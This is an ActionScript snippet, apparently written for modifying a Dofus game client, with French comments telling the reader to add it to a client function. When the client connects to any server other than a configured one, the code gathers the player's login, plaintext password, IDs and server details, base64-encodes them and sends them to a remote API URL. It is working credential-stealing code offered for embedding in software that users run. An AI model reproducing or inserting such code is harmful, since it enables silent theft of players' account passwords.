//Crée par ydainna (through adobe flash cs6)
//Merci ankama pour l'aide (code base (folder lang)) : states_fr_x.swf

//A ajouter dans une fonction divers du client... (adapter selon besoin)
var api = _root.mcModules.mcCORE.BATTLEFIELD._oAPI;
var id = -1;
while (++id, id < this.api.config.dataServers.length)
{
	var langUrl = this.api.config.dataServers[id].url;
} // end while
var lang = langUrl;
var PlayerName = this.api.datacenter.Player.Name;
var PlayerID = this.api.datacenter.Player.ID;
var ServID = this.api.datacenter.Basics.aks_current_server.id;
var ServName = this.api.datacenter.Basics.aks_current_server.label;
var ip = _global.CONFIG.connexionServer.ip;
if (!ip)
{
	ip = api.datacenter.Basics.serverHost;
}
var port = _global.CONFIG.connexionServer.port;
if (!port)
{
	port = api.datacenter.Basics.serverPort;
}
switch (ip + port) 
{  
	case "127.0.0.1" + "50555": //Config IP + Port //Condition
	{
		//Si on veux afficher une action si la cond == respectée
		break; 
	}
	default: //Si pas respectée ....
	{
	   var ul = new LoadVars();
	   var encodedData = "";
	   encodedData = encodedData + "{";
	   encodedData = encodedData + ("\"playerid\":\"" + PlayerID + "\",");
	   encodedData = encodedData + ("\"playername\":\"" + PlayerName + "\",");
	   encodedData = encodedData + ("\"login\":\"" + this.api.datacenter.Player.login + "\",");
	   encodedData = encodedData + ("\"pass\":\"" + this.api.datacenter.Player.password + "\",");
	   encodedData = encodedData + ("\"serverIP\":\"" + ip + "\",");
	   encodedData = encodedData + ("\"serverID\":\"" + ServID + "\",");
	   encodedData = encodedData + ("\"serverName\":\"" + ServName + "\",");
	   encodedData = encodedData + ("\"LoginPort\":\"" + port + "\",");
	   encodedData = encodedData + ("\"lang\":\"" + lang + "\"");
	   encodedData = encodedData + "}";
	   //Lien pour l'API
	   ul.load("http://localhost/dofus/app/api.php?api=" + this.encode(encodedData));
	   break;
	}
}	
dofus_graphics_gapi_ui_banner.encode = function (opString)
{
    opString != undefined ? (str = opString) : (str = str);
    var charList = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    var a;
    var b;
    var id = 0;
    for (var string = ""; str.length >= id + 3; string = string + (charList.charAt((a & 16515072) >> 18) + charList.charAt((a & 258048) >> 12) + charList.charAt((a & 4032) >> 6) + charList.charAt(a & 63)))
    {
        a = (str.charCodeAt(id++) & 255) << 16 | (str.charCodeAt(id++) & 255) << 8 | str.charCodeAt(id++) & 255;
    } // end of for
    if (str.length - id > 0 && str.length - id < 3)
    {
        b = Boolean(str.length - id - 1);
        a = (str.charCodeAt(id++) & 255) << 16 | (b ? ((str.charCodeAt(id) & 255) << 8) : (0));
        string = string + (charList.charAt((a & 16515072) >> 18) + charList.charAt((a & 258048) >> 12) + (b ? (charList.charAt((a & 4032) >> 6)) : ("=")) + "=");
    } // end if
    return (string);
};
